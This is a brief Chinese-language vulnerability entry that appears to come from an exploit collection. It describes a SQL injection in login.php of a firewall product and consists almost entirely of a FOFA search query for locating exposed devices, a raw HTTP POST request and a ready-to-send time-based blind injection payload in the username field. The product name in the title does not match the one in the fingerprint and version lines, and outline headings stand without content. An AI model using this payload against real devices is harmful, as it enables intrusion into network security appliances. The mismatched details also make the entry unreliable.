# 皓峰防火墙login.php存在SQL注入漏洞

- **系统**：皓峰防火墙　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`fofa：title="佑友防火墙"`
- **请求**：`POST /login.php HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=qc13eucchtnbr161lnca4ibde1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 67`

**请求体 / payload**
```
action=login&username=dadsa' AND (SELECT 6357 FROM (SELECT(SLEEP(5)))DIFt) AND 'lKDb'='lKDb&password=dada&submit=%E7%99%BB%E5%BD%95
POST /login.php HTTP/1.1
Host:
Cookie: PHPSESSID=qc13eucchtnbr161lnca4ibde1
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
action=login&username=dadsa&password=dada&submit=%E7%99%BB%E5%BD%95
>
```

**其他**
- 皓峰防火墙login.php存在SQL注入漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 佑友防火墙